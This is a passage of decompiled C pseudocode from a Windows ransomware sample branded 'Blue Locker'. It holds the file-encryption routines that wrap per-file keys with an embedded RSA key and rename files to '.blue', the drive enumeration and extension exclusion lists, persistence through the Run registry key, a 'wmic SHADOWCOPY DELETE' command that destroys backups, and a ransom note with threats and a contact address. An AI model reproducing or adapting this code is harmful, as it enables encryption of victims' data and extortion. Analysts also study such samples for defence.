  v11 = (void (__stdcall *)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))SetFilePointerEx;
  v27 = a3[4] | ((a3[5] | ((v10 | (a3[7] << 8)) << 8)) << 8);
  SetFilePointerEx(hFile, 0i64, 0, 0);
  v12 = 0;
  liDistanceToMove_4 = 0;
LABEL_2:
  v13 = ReadFile;
  if ( v12 == 2 )
  {
    while ( v13(hFile, stru_4154C8, 0x10000u, &NumberOfBytesRead, 0) )
    {
      sub_4013F0(v23, stru_4154C8, NumberOfBytesRead);
      v19.HighPart = -(NumberOfBytesRead != 0);
      v19.LowPart = -NumberOfBytesRead;
      v11(hFile, v19, 0, 1u);
      if ( !WriteFile(hFile, stru_4154C8, NumberOfBytesRead, &NumberOfBytesWritten, 0) )
        break;
      v13 = ReadFile;
      if ( NumberOfBytesRead < 0x10000 )
        return 0;
    }
  }
  else
  {
    v14 = 0i64;
    while ( v13(hFile, stru_4154C8, 0x10000u, &NumberOfBytesRead, 0) )
    {
      sub_4013F0(v23, stru_4154C8, NumberOfBytesRead);
      v18.HighPart = -(NumberOfBytesRead != 0);
      v18.LowPart = -NumberOfBytesRead;
      SetFilePointerEx(hFile, v18, 0, 1u);
      if ( !WriteFile(hFile, stru_4154C8, NumberOfBytesRead, &NumberOfBytesWritten, 0) )
        break;
      v15 = NumberOfBytesRead + v14;
      v14 += NumberOfBytesRead;
      v13 = ReadFile;
      if ( (((unsigned __int64)(v14 + 0x10000) >> 32) & 0x80000000) == 0i64
        && (!(((((unsigned __int64)(v14 + 0x10000) >> 32) & 0x80000000) != 0i64) ^ __OFADD__(
                                                                                     v15 >= 0xFFFF0000,
                                                                                     HIDWORD(v14)) | ((unsigned __int64)(v14 + 0x10000) >> 32 == 0))
         || (unsigned int)(v14 + 0x10000) > 0x2300000) )
      {
        v16 = (v14 + __PAIR64__(v20, v21)) >> 32;
        v11 = (void (__stdcall *)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))SetFilePointerEx;
        SetFilePointerEx(hFile, (LARGE_INTEGER)(__PAIR64__(v16, (unsigned int)v14 + v21) - 36634624), 0, 1u);
        v12 = liDistanceToMove_4 + 1;
        liDistanceToMove_4 = v12;
        if ( v12 >= 3 )
          return 0;
        goto LABEL_2;
      }
    }
  }
  return -1;
}
// 4154C8: using guessed type __m128i stru_4154C8[4096];
// 401840: using guessed type __m128i var_54[3];

//----- (00401A80) --------------------------------------------------------
int __usercall sub_401A80@<eax>(HCRYPTKEY a1@<edx>, LPCWSTR lpFileName, unsigned __int8 *a3, unsigned __int8 *a4)
{
  HANDLE FileW; // ebx
  DWORD FileSize; // eax
  int v7; // esi
  int v8; // eax
  WCHAR *v9; // esi
  size_t v10; // eax
  size_t v11; // eax
  int v12; // ecx
  int v13; // ecx
  int v14; // eax
  void (__stdcall *v15)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD); // edi
  DWORD v16; // esi
  unsigned __int8 *v17; // esi
  int v18; // ecx
  int v19; // ecx
  int v20; // eax
  _DWORD *v21; // eax
  int v22; // ecx
  int v23; // esi
  WCHAR *v24; // edi
  LARGE_INTEGER v25; // [esp-10h] [ebp-9Ch]
  LARGE_INTEGER v26; // [esp-10h] [ebp-9Ch]
  int v27; // [esp-4h] [ebp-90h]
  const WCHAR *lpNewFileName; // [esp+18h] [ebp-74h]
  void *lpBuffer; // [esp+2Ch] [ebp-60h]
  __m128i v31[3]; // [esp+30h] [ebp-5Ch] BYREF
  int v32; // [esp+60h] [ebp-2Ch]
  int v33; // [esp+64h] [ebp-28h]
  int v34; // [esp+68h] [ebp-24h]
  int v35; // [esp+6Ch] [ebp-20h]
  DWORD NumberOfBytesWritten; // [esp+74h] [ebp-18h] BYREF
  DWORD FileSizeHigh; // [esp+78h] [ebp-14h] BYREF
  DWORD v38; // [esp+7Ch] [ebp-10h] BYREF
  DWORD NumberOfBytesRead; // [esp+80h] [ebp-Ch] BYREF

  FileW = CreateFileW(lpFileName, 0xC0000000, 1u, 0, 3u, 0x80u, 0);
  FileSizeHigh = 0;
  FileSize = GetFileSize(FileW, &FileSizeHigh);
  v38 = FileSizeHigh;
  NumberOfBytesRead = FileSize;
  if ( FileW == (HANDLE)-1 )
    return -1;
  v7 = lstrlenW(lpFileName);
  v8 = lstrlenW(L".blue");
  v9 = (WCHAR *)calloc(__CFADD__(v8 + v7, 2) ? -1 : v8 + v7 + 2, 2u);
  lpNewFileName = v9;
  if ( v9 )
  {
    v27 = lstrlenW(lpFileName);
    v10 = _msize(v9);
    wcsncpy_s(v9, v10 >> 1, lpFileName, v27);
    v11 = _msize(v9);
    wcscat_s(v9, v11 >> 1, L".blue");
    if ( (v38 & 0x80000000) == 0 )
    {
      if ( (int)v38 > 0 )
        goto LABEL_16;
      if ( NumberOfBytesRead >= 0xA00000 )
      {
        if ( NumberOfBytesRead < 0x6400000 )
        {
          v38 = GetFileSize(FileW, 0) >> 1;
          sub_4012B0(v31, a3);
          v12 = a4[1] | (*((unsigned __int16 *)a4 + 1) << 8);
          v32 = 0;
          v13 = *a4 | (v12 << 8);
          v33 = 0;
          v14 = a4[6];
          v34 = v13;
          v15 = (void (__stdcall *)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))SetFilePointerEx;
          v35 = a4[4] | ((a4[5] | ((v14 | (a4[7] << 8)) << 8)) << 8);
          SetFilePointerEx(FileW, 0i64, 0, 0);
          v16 = 0;
          if ( ReadFile(FileW, stru_4454C8, 0x10000u, &NumberOfBytesRead, 0) )
          {
            do
            {
              sub_4013F0(v31, stru_4454C8, NumberOfBytesRead);
              v25.HighPart = -(NumberOfBytesRead != 0);
              v25.LowPart = -NumberOfBytesRead;
              SetFilePointerEx(FileW, v25, 0, 1u);
              if ( !WriteFile(FileW, stru_4454C8, NumberOfBytesRead, &NumberOfBytesWritten, 0) )
                break;
              v16 += NumberOfBytesRead;
              if ( v16 > v38 )
                break;
            }
            while ( NumberOfBytesRead >= 0x10000 && ReadFile(FileW, stru_4454C8, 0x10000u, &NumberOfBytesRead, 0) );
          }
LABEL_21:
          v17 = a3;
          goto LABEL_22;
        }
        if ( NumberOfBytesRead < 0x3E800000 )
        {
          v17 = a3;
          sub_4015A0(FileW, a3, a4);
          v15 = (void (__stdcall *)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))SetFilePointerEx;
LABEL_22:
          v15(FileW, 0i64, 0, 2u);
          v21 = calloc(0x20Cu, 1u);
          v38 = 0;
          lpBuffer = v21;
          NumberOfBytesRead = 264;
          if ( v21 )
          {
            qmemcpy(v21, v17, 0x100u);
            v22 = *((_DWORD *)a4 + 1);
            v21[64] = *(_DWORD *)a4;
            v21[65] = v22;
            if ( CryptEncrypt(a1, 0, 1, 0, (BYTE *)v21, &NumberOfBytesRead, 0x20Cu) )
              WriteFile(FileW, lpBuffer, NumberOfBytesRead, &v38, 0);
            j___free_base(lpBuffer);
          }
          v23 = 0;
          goto LABEL_28;
        }
LABEL_16:
        v17 = a3;
        sub_401840(FileW, a3, a4);
        v15 = (void (__stdcall *)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))SetFilePointerEx;
        goto LABEL_22;
      }
    }
    sub_4012B0(v31, a3);
    v18 = a4[1] | (*((unsigned __int16 *)a4 + 1) << 8);
    v32 = 0;
    v19 = *a4 | (v18 << 8);
    v33 = 0;
    v20 = a4[6];
    v34 = v19;
    v15 = (void (__stdcall *)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))SetFilePointerEx;
    v35 = a4[4] | ((a4[5] | ((v20 | (a4[7] << 8)) << 8)) << 8);
    SetFilePointerEx(FileW, 0i64, 0, 0);
    if ( ReadFile(FileW, stru_4354C8, 0x10000u, &NumberOfBytesRead, 0) )
    {
      do
      {
        sub_4013F0(v31, stru_4354C8, NumberOfBytesRead);
        v26.HighPart = -(NumberOfBytesRead != 0);
        v26.LowPart = -NumberOfBytesRead;
        SetFilePointerEx(FileW, v26, 0, 1u);
      }
      while ( WriteFile(FileW, stru_4354C8, NumberOfBytesRead, &NumberOfBytesWritten, 0)
           && NumberOfBytesRead >= 0x10000
           && ReadFile(FileW, stru_4354C8, 0x10000u, &NumberOfBytesRead, 0) );
    }
    goto LABEL_21;
  }
  v23 = -1;
LABEL_28:
  if ( FileW )
  {
    CloseHandle(FileW);
    v24 = (WCHAR *)lpNewFileName;
    MoveFileW(lpFileName, lpNewFileName);
  }
  else
  {
    v24 = (WCHAR *)lpNewFileName;
  }
  j___free_base(v24);
  return v23;
}
// 401B94: conditional instruction was optimized away because %var_10.4==0
// 401CCF: conditional instruction was optimized away because %var_10.4==0
// 401CD1: conditional instruction was optimized away because ecx.4>=0
// 401B9A: conditional instruction was optimized away because %var_10.4==0
// 4354C8: using guessed type __m128i stru_4354C8[4096];
// 4454C8: using guessed type __m128i stru_4454C8[4096];
// 401A80: using guessed type __m128i var_5C[3];

//----- (00401EE0) --------------------------------------------------------
int __usercall sub_401EE0@<eax>(int a1@<ebp>)
{
  DWORD LogicalDriveStringsW; // esi
  WCHAR *v2; // eax
  unsigned int v3; // edi
  HANDLE *v4; // esi
  const WCHAR *v5; // edi
  int v6; // eax
  void *v7; // esi
  size_t v8; // eax
  size_t v9; // eax
  _DWORD *v10; // eax
  DWORD v11; // eax
  signed int i; // esi
  HANDLE *v13; // ecx
  signed int v14; // edx
  signed int j; // esi
  rsize_t v17; // [esp-64h] [ebp-70h]
  unsigned int v18; // [esp-4Ch] [ebp-58h]
  unsigned int v19; // [esp-48h] [ebp-54h]
  WCHAR *v20; // [esp-44h] [ebp-50h]
  struct _SYSTEM_INFO v21; // [esp-40h] [ebp-4Ch] BYREF
  int v22; // [esp+0h] [ebp-Ch]
  int v23; // [esp+4h] [ebp-8h]
  int retaddr; // [esp+Ch] [ebp+0h]

  v22 = a1;
  v23 = retaddr;
  LogicalDriveStringsW = GetLogicalDriveStringsW(0, 0);
  v2 = (WCHAR *)calloc(__CFADD__(LogicalDriveStringsW, 2) ? -1 : LogicalDriveStringsW + 2, 2u);
  v20 = v2;
  if ( v2 )
  {
    GetLogicalDriveStringsW(LogicalDriveStringsW, v2);
    v3 = 0;
    v19 = 0;
    v18 = LogicalDriveStringsW - 1;
    if ( LogicalDriveStringsW == 1 )
    {
LABEL_20:
      j___free_base(v20);
      return 0;
    }
    while ( 1 )
    {
      memset(&v21, 0, sizeof(v21));
      GetNativeSystemInfo(&v21);
      nCount = v21.dwNumberOfProcessors;
      v4 = (HANDLE *)calloc(
                       (unsigned __int64)v21.dwNumberOfProcessors >> 30 != 0 ? -1 : 4 * v21.dwNumberOfProcessors,
                       1u);
      if ( !v4 )
        break;
      InitializeCriticalSection(&CriticalSection);
      Block = v4;
      v5 = &v20[v3];
      v6 = lstrlenW(v5);
      v7 = calloc(__CFADD__(v6, 4) ? -1 : v6 + 4, 2u);
      if ( v7 )
      {
        v17 = lstrlenW(v5) - 1;
        v8 = _msize(v7);
        wcsncpy_s((wchar_t *)v7, v8 >> 1, v5, v17);
        v9 = _msize(v7);
        wcscat_s((wchar_t *)v7, v9 >> 1, L"\\*");
        v10 = calloc(8u, 1u);
        if ( v10 )
        {
          *v10 = 0;
          v10[1] = 0;
          if ( dword_4154C0 )
          {
            *(_DWORD *)(dword_4154C4 + 4) = v10;
            dword_4154C4 = *(_DWORD *)(dword_4154C4 + 4);
            *(_DWORD *)dword_4154C4 = v7;
          }
          else
          {
            dword_4154C0 = (int)v10;
            dword_4154C4 = (int)v10;
            *v10 = v7;
          }
        }
        v11 = nCount;
        for ( i = 0; i < (int)nCount; v11 = nCount )
          Block[i++] = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, &Block, 0, 0);
      }
      else
      {
        v11 = nCount;
      }
      WaitForMultipleObjects(v11, Block, 1, 0xFFFFFFFF);
      DeleteCriticalSection(&CriticalSection);
      v13 = Block;
      if ( Block )
      {
        v14 = nCount;
        for ( j = 0; j < v14; ++j )
        {
          if ( v13[j] )
          {
            CloseHandle(v13[j]);
            v14 = nCount;
            v13 = Block;
          }
        }
        j___free_base(v13);
      }
      v3 = lstrlenW(v20) + v19 + 1;
      v19 = v3;
      if ( v3 >= v18 )
        goto LABEL_20;
    }
    j___free_base(v20);
  }
  return -1;
}
// 401EE0: could not find valid save-restore pair for ebp
// 4154C0: using guessed type int dword_4154C0;
// 4154C4: using guessed type int dword_4154C4;

//----- (00402160) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  HANDLE MutexW; // eax
  WCHAR *v6; // eax
  const WCHAR *v7; // esi
  int v8; // eax
  HKEY phkResult; // [esp+0h] [ebp-Ch] BYREF
  HCRYPTPROV phProv; // [esp+4h] [ebp-8h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  MutexW = CreateMutexW(0, 1, L"wbizecif48njqgpprzkm6769");
  if ( WaitForSingleObject(MutexW, 0) )
    return -1;
  if ( CryptAcquireContextW(&phProv, 0, L"Microsoft Enhanced RSA and AES Cryptographic Provider", 0x18u, 0xF0000000)
    || CryptAcquireContextW(&phProv, 0, L"Microsoft Enhanced RSA and AES Cryptographic Provider", 0x18u, 0xF0000008)
    || CryptAcquireContextW(
         &phProv,
         0,
         L"Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)",
         0x18u,
         0xF0000000)
    || CryptAcquireContextW(
         &phProv,
         0,
         L"Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)",
         0x18u,
         0xF0000008) )
  {
    v6 = (WCHAR *)calloc(0x208u, 1u);
    v7 = v6;
    if ( v6 )
    {
      GetModuleFileNameW(0, v6, 0x208u);
      lpData = v7;
      if ( !RegOpenKeyExW(
              HKEY_CURRENT_USER,
              L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
              0,
              0xF003Fu,
              &phkResult) )
      {
        v8 = lstrlenW(lpData);
        if ( !RegSetValueExW(phkResult, L"Bule Cryptor", 0, 1u, (const BYTE *)lpData, 2 * v8 + 1) )
          ShellExecuteW(0, L"open", L"cmd.exe", L"/C wmic SHADOWCOPY DELETE", 0, 0);
      }
    }
  }
  if ( phProv )
    CryptReleaseContext(phProv, 0);
  sub_401EE0((int)&savedregs);
  return 0;
}

//----- (004022C0) --------------------------------------------------------
int __fastcall sub_4022C0(HCRYPTPROV a1, HCRYPTKEY a2, LPCWSTR lpFileName, int a4)
{
  int v4; // esi
  HANDLE FirstFileW; // eax
  int (__stdcall *v6)(LPCWSTR); // edi
  int v7; // esi
  int v8; // eax
  void *v9; // esi
  size_t v10; // eax
  size_t v11; // eax
  HANDLE FileW; // edi
  PWSTR (__stdcall *v13)(PCWSTR, PCWSTR); // ebx
  int (__stdcall *v14)(LPCWSTR, LPCWSTR); // esi
  int v15; // esi
  int v16; // esi
  int v17; // esi
  int v18; // eax
  void *v19; // esi
  size_t v20; // eax
  size_t v21; // eax
  size_t v22; // eax
  struct _RTL_CRITICAL_SECTION *v23; // edi
  _DWORD *v24; // eax
  _DWORD *v25; // eax
  int v26; // esi
  int v27; // esi
  int v28; // eax
  void *v29; // esi
  size_t v30; // eax
  size_t v31; // eax
  unsigned __int8 *v32; // edi
  unsigned __int8 *v33; // ebx
  rsize_t v35; // [esp-4h] [ebp-2DCh]
  rsize_t v36; // [esp-4h] [ebp-2DCh]
  rsize_t v37; // [esp-4h] [ebp-2DCh]
  HANDLE hFindFile; // [esp+18h] [ebp-2C0h]
  LPCWSTR lpString2; // [esp+20h] [ebp-2B8h]
  const wchar_t *v42; // [esp+24h] [ebp-2B4h]
  const wchar_t *v43; // [esp+28h] [ebp-2B0h]
  const wchar_t *v44; // [esp+2Ch] [ebp-2ACh]
  const wchar_t *v45; // [esp+30h] [ebp-2A8h]
  const wchar_t *v46; // [esp+34h] [ebp-2A4h]
  const wchar_t *v47; // [esp+38h] [ebp-2A0h]
  const wchar_t *v48; // [esp+3Ch] [ebp-29Ch]
  const wchar_t *v49; // [esp+40h] [ebp-298h]
  const wchar_t *v50; // [esp+44h] [ebp-294h]
  const wchar_t *v51; // [esp+48h] [ebp-290h]
  const wchar_t *v52; // [esp+4Ch] [ebp-28Ch]
  const wchar_t *v53; // [esp+50h] [ebp-288h]
  const wchar_t *v54; // [esp+54h] [ebp-284h]
  const wchar_t *v55; // [esp+58h] [ebp-280h]
  const wchar_t *v56; // [esp+5Ch] [ebp-27Ch]
  const wchar_t *v57; // [esp+60h] [ebp-278h]
  const wchar_t *v58; // [esp+64h] [ebp-274h]
  const wchar_t *v59; // [esp+68h] [ebp-270h]
  const wchar_t *v60; // [esp+6Ch] [ebp-26Ch]
  const wchar_t *v61; // [esp+70h] [ebp-268h]
  const wchar_t *v62; // [esp+74h] [ebp-264h]
  DWORD NumberOfBytesWritten; // [esp+7Ch] [ebp-25Ch] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+80h] [ebp-258h] BYREF

  memset(&FindFileData, 0, sizeof(FindFileData));
  v4 = -1;
  FirstFileW = FindFirstFileW(lpFileName, &FindFileData);
  hFindFile = FirstFileW;
  if ( FirstFileW == (HANDLE)-1 )
  {
LABEL_39:
    FindClose(FirstFileW);
    return v4;
  }
  v6 = lstrlenW;
  v7 = lstrlenW(lpFileName);
  v8 = lstrlenW(L"restore_file.txt");
  v9 = calloc(__CFADD__(v8 + v7, 2) ? -1 : v8 + v7 + 2, 2u);
  if ( v9 )
  {
    v35 = lstrlenW(lpFileName) - 1;
    v10 = _msize(v9);
    wcsncpy_s((wchar_t *)v9, v10 >> 1, lpFileName, v35);
    v11 = _msize(v9);
    wcscat_s((wchar_t *)v9, v11 >> 1, L"restore_file.txt");
    FileW = CreateFileW((LPCWSTR)v9, 0x40000000u, 2u, 0, 1u, 0x80u, 0);
    if ( FileW != (HANDLE)-1 )
    {
      NumberOfBytesWritten = 0;
      WriteFile(
        FileW,
        "-------------------------------------------------------------------------------\r\n"
        "----------- [ Hello! ] ------------->\r\n"
        "\r\n"
        "       ****BY BLUE LOCKER****\r\n"
        "\r\n"
        "What happend?\r\n"
        "----------------------------------------------\r\n"
        "Your computers and servers are encrypted, backups are deleted from your network and copied. We use strong encryp"
        "tion algorithms, so you cannot decrypt your data.\r\n"
        "But you can restore everything by purchasing a special program from us - a universal decoder. This program will "
        "restore your entire network.\r\n"
        "Follow our instructions below and you will recover all your data.\r\n"
        "If you continue to ignore this for a long time, we will start reporting the hack to mainstream media and posting"
        " your data to the dark web.\r\n"
        "\r\n"
        "What guarantees?\r\n"
        "----------------------------------------------\r\n"
        "We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our intere"
        "sts.\r\n"
        "All our decryption software is perfectly tested and will decrypt your data. We will also provide support in case"
        " of problems.\r\n"
        "We guarantee to decrypt one file for free. email us.\r\n"
        "\r\n"
        "How to contact us?\r\n"
        "----------------------------------------------\r\n"
        "You can write us to our mailbox : grepmord@protonmail.com\r\n"
        "\r\n"
        "!!! DANGER !!!\r\n"
        "DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them.\r\n"
        "!!! DANGER !!\r\n"
        "\r\n",
        0x548u,
        &NumberOfBytesWritten,
        0);
      CloseHandle(FileW);
    }
    j___free_base(v9);
    v6 = lstrlenW;
  }
  v13 = StrStrIW;
  v14 = lstrcmpW;
  do
  {
    if ( (!v13(FindFileData.cFileName, L"Microsoft") || v13(FindFileData.cFileName, L"Microsoft SQL Server"))
      && v14(FindFileData.cFileName, L".")
      && v14(FindFileData.cFileName, L"..")
      && (FindFileData.dwFileAttributes & 0x400) == 0 )
    {
      if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
      {
        if ( FindFileData.cFileName[0] == 46 )
          goto LABEL_37;
        lpString2 = L"AppData";
        v15 = 0;
        v42 = L"tmp";
        v43 = L"winnt";
        v44 = L"temp";
        v45 = L"thumb";
        v46 = L"RECYCLER";
        v47 = L"$Recycle.Bin";
        v48 = L"$RECYCLE.BIN";
        v49 = L"System Volume Information";
        v50 = L"Boot";
        v51 = L"Windows";
        v52 = L"$WINDOWS.~BT";
        v53 = L"Windows.old";
        v54 = L"PerfLog";
        v55 = L"Microsoft";
        while ( lstrcmpiW(FindFileData.cFileName, (&lpString2)[v15]) )
        {
          if ( ++v15 >= 15 )
          {
            v16 = v6(lpFileName);
            v17 = v6(L"\\*") + v16;
            v18 = v6(FindFileData.cFileName);
            v19 = calloc(__CFADD__(v17 + v18, 2) ? -1 : v17 + v18 + 2, 2u);
            if ( !v19 )
              break;
            v36 = v6(lpFileName) - 1;
            v20 = _msize(v19);
            wcsncpy_s((wchar_t *)v19, v20 >> 1, lpFileName, v36);
            v21 = _msize(v19);
            wcscat_s((wchar_t *)v19, v21 >> 1, FindFileData.cFileName);
            v22 = _msize(v19);
            wcscat_s((wchar_t *)v19, v22 >> 1, L"\\*");
            v23 = (struct _RTL_CRITICAL_SECTION *)(a4 + 8);
            EnterCriticalSection((LPCRITICAL_SECTION)(a4 + 8));
            v24 = calloc(8u, 1u);
            if ( v24 )
            {
              *v24 = 0;
              v24[1] = 0;
              if ( !*(_DWORD *)(a4 + 32) )
              {
                *(_DWORD *)(a4 + 32) = v24;
                *(_DWORD *)(a4 + 36) = v24;
                *v24 = v19;
                LeaveCriticalSection(v23);
                break;
              }
              *(_DWORD *)(*(_DWORD *)(a4 + 36) + 4) = v24;
              v25 = *(_DWORD **)(*(_DWORD *)(a4 + 36) + 4);
              *(_DWORD *)(a4 + 36) = v25;
              *v25 = v19;
            }
            LeaveCriticalSection(v23);
            break;
          }
        }
      }
      else
      {
        lpString2 = L".exe";
        v26 = 0;
        v42 = L".dll";
        v43 = L".sys";
        v44 = L".com";
        v45 = L".msi";
        v46 = L".mui";
        v47 = L".inf";
        v48 = L".cat";
        v49 = L".bat";
        v50 = L".cmd";
        v51 = L".ps1";
        v52 = L".vbs";
        v53 = L".ttf";
        v54 = L".fon";
        v55 = L".lnk";
        v56 = L".ini";
        v57 = L".log";
        v58 = L".blue";
        v59 = L"restore_file.txt";
        v60 = L"NTUSER.DAT";
        v61 = L"ntldr";
        v62 = L"bootmgr";
        while ( !v13(FindFileData.cFileName, (&lpString2)[v26]) )
        {
          if ( ++v26 >= 22 )
          {
            v27 = v6(lpFileName);
            v28 = v6(FindFileData.cFileName);
            v29 = calloc(__CFADD__(v28 + v27, 2) ? -1 : v28 + v27 + 2, 2u);
            if ( v29 )
            {
              v37 = v6(lpFileName) - 1;
              v30 = _msize(v29);
              wcsncpy_s((wchar_t *)v29, v30 >> 1, lpFileName, v37);
              v31 = _msize(v29);
              wcscat_s((wchar_t *)v29, v31 >> 1, FindFileData.cFileName);
              v32 = (unsigned __int8 *)calloc(0x100u, 1u);
              if ( v32 )
              {
                v33 = (unsigned __int8 *)calloc(8u, 1u);
                if ( v33 )
                {
                  if ( CryptGenRandom(a1, 0x100u, v32) && CryptGenRandom(a1, 8u, v33) )
                    sub_401A80(a2, (LPCWSTR)v29, v32, v33);
                  j___free_base(v29);
                  j___free_base(v32);
                  j___free_base(v33);
                }
                else
                {
                  j___free_base(v29);
                  j___free_base(v32);
                }
                v13 = StrStrIW;
              }
              else
              {
                j___free_base(v29);
              }
            }
            break;
          }
        }
      }
      v14 = lstrcmpW;
    }
LABEL_37:
    v6 = lstrlenW;
  }
  while ( FindNextFileW(hFindFile, &FindFileData) );
  FirstFileW = hFindFile;
  v4 = 0;
  if ( hFindFile )
    goto LABEL_39;
  return v4;
}
// 411E80: using guessed type wchar_t aAppdata[8];
// 411E90: using guessed type wchar_t aTmp[4];
// 411E98: using guessed type wchar_t aWinnt[6];
// 411EA4: using guessed type wchar_t aTemp[5];
// 411EB0: using guessed type wchar_t aThumb[6];
// 411EBC: using guessed type wchar_t aRecycler[9];
// 411ED0: using guessed type wchar_t aRecycleBin[13];
// 411EEC: using guessed type wchar_t aRecycleBin_0[13];
// 411F08: using guessed type wchar_t aSystemVolumeIn[26];
// 411F3C: using guessed type wchar_t aBoot[5];
// 411F48: using guessed type wchar_t aWindows[8];
// 411F58: using guessed type wchar_t aWindowsBt[13];
// 411F74: using guessed type wchar_t aWindowsOld[12];
// 411F8C: using guessed type wchar_t aPerflog[8];
// 411FB0: using guessed type wchar_t aExe[5];
// 411FBC: using guessed type wchar_t aDll[5];
// 411FC8: using guessed type wchar_t aSys[5];
// 411FD4: using guessed type wchar_t aCom[5];
// 411FE0: using guessed type wchar_t aMsi[5];
// 411FEC: using guessed type wchar_t aMui[5];
// 411FF8: using guessed type wchar_t aInf[5];
// 412004: using guessed type wchar_t aCat[5];
// 412010: using guessed type wchar_t aBat[5];
// 41201C: using guessed type wchar_t aCmd[5];
// 412028: using guessed type wchar_t aPs1[5];
// 412034: using guessed type wchar_t aVbs[5];
// 412040: using guessed type wchar_t aTtf[5];
// 41204C: using guessed type wchar_t aFon[5];
// 412058: using guessed type wchar_t aLnk[5];
// 412064: using guessed type wchar_t aIni[5];
// 412070: using guessed type wchar_t aLog[5];
// 4120A0: using guessed type wchar_t aNtuserDat[11];
// 4120B8: using guessed type wchar_t aNtldr[6];
// 4120C4: using guessed type wchar_t aBootmgr[8];

//----- (00402840) --------------------------------------------------------
int __thiscall sub_402840(HCRYPTPROV *phProv)
{
  if ( CryptAcquireContextW(phProv, 0, L"Microsoft Enhanced RSA and AES Cryptographic Provider", 0x18u, 0xF0000000)
    || CryptAcquireContextW(phProv, 0, L"Microsoft Enhanced RSA and AES Cryptographic Provider", 0x18u, 0xF0000008)
    || CryptAcquireContextW(
         phProv,
         0,
         L"Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)",
         0x18u,
         0xF0000000) )
  {
    return 0;
  }
  else
  {
    return CryptAcquireContextW(
             phProv,
             0,
             L"Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)",
             0x18u,
             0xF0000008)
         - 1;
  }
}

//----- (004028B0) --------------------------------------------------------
void __stdcall __noreturn StartAddress(char *lpThreadParameter)
{
  int i; // esi
  LPCWSTR *v2; // eax
  void **v3; // esi
  int v4; // eax
  wchar_t *v5; // eax
  size_t v6; // eax
  const wchar_t *v7; // [esp-4h] [ebp-20h]
  wchar_t *Destination; // [esp+Ch] [ebp-10h]
  HCRYPTKEY phKey; // [esp+10h] [ebp-Ch] BYREF
  HCRYPTPROV hProv; // [esp+14h] [ebp-8h] BYREF

  if ( sub_402840(&hProv) != -1 && CryptImportKey(hProv, &pbData, 0x214u, 0, 0, &phKey) )
  {
    while ( 1 )
    {
      for ( i = 0; ; ++i )
      {
        if ( i == 5 )
          goto LABEL_10;
        EnterCriticalSection((LPCRITICAL_SECTION)(lpThreadParameter + 8));
        if ( *((_DWORD *)lpThreadParameter + 8) )
          break;
        LeaveCriticalSection((LPCRITICAL_SECTION)(lpThreadParameter + 8));
        Sleep(0x1F4u);
      }
      v2 = (LPCWSTR *)sub_402A00(lpThreadParameter);
      v3 = (void **)v2;
      if ( v2 )
      {
        v4 = lstrlenW(*v2);
        v5 = (wchar_t *)calloc(__CFADD__(v4, 2) ? -1 : v4 + 2, 2u);
        Destination = v5;
        if ( v5 )
        {
          v7 = (const wchar_t *)*v3;
          v6 = _msize(v5);
          wcscpy_s(Destination, v6 >> 1, v7);
          sub_4029D0(v3);
          LeaveCriticalSection((LPCRITICAL_SECTION)(lpThreadParameter + 8));
          sub_4022C0(hProv, phKey, Destination, (int)lpThreadParameter);
          j___free_base(Destination);
        }
      }
    }
  }
LABEL_10:
  if ( hProv )
    CryptReleaseContext(hProv, 0);
  ExitThread(0xFFFFFFFF);
}

//----- (004029D0) --------------------------------------------------------
void __thiscall sub_4029D0(void **Block)
{
  if ( Block )
  {
    if ( *Block )
      j___free_base(*Block);
    j___free_base(Block);
  }
}

//----- (00402A00) --------------------------------------------------------
int __thiscall sub_402A00(_DWORD *this)
{
  int result; // eax

  result = this[8];
  if ( !result )
    return 0;
  this[8] = *(_DWORD *)(result + 4);
  return result;
}

//----- (00402ACA) --------------------------------------------------------
int sub_402ACA()
{
  __scrt_initialize_default_local_stdio_options();
  return 0;
}
// 4030C1: using guessed type int __scrt_initialize_default_local_stdio_options(void);

//----- (00402AD2) --------------------------------------------------------
int sub_402AD2()
{
  int v0; // eax

  sub_403289();
  v0 = UserMathErrorFunction();
  return _set_new_mode(v0);
}

//----- (00403075) --------------------------------------------------------
int __cdecl UserMathErrorFunction()
{
  return 0;
}

//----- (00403078) --------------------------------------------------------
int sub_403078()
{
  return 1;
}

//----- (00403082) --------------------------------------------------------
void sub_403082()
{
  InitializeSListHead(&ListHead);
}

//----- (0040308E) --------------------------------------------------------
char sub_40308E()
{
  return 1;
}

//----- (004030B5) --------------------------------------------------------
void *sub_4030B5()
{
  return &unk_414CE8;
}

//----- (004030BB) --------------------------------------------------------
void *sub_4030BB()
{
  return &unk_414CF0;
}

//----- (004030DE) --------------------------------------------------------
BOOL sub_4030DE()
{
  return dword_41400C == 0;
}
// 41400C: using guessed type int dword_41400C;

//----- (004030EA) --------------------------------------------------------
void *sub_4030EA()
{
  return &unk_4554D0;
}

//----- (004030F0) --------------------------------------------------------
void *sub_4030F0()
{
  return &unk_4554CC;
}

//----- (00403289) --------------------------------------------------------
LPTOP_LEVEL_EXCEPTION_FILTER sub_403289()
{
  return SetUnhandledExceptionFilter(__scrt_unhandled_exception_filter);
}

//----- (004032EB) --------------------------------------------------------
void sub_4032EB()
{
  dword_414CF8 = 0;
}
// 414CF8: using guessed type int dword_414CF8;

//----- (004032F3) --------------------------------------------------------
void sub_4032F3()
{
  ;
}
// 4032F3: could not find valid save-restore pair for edi

//----- (0040331F) --------------------------------------------------------
void __cdecl sub_40331F()
{
  ;
}
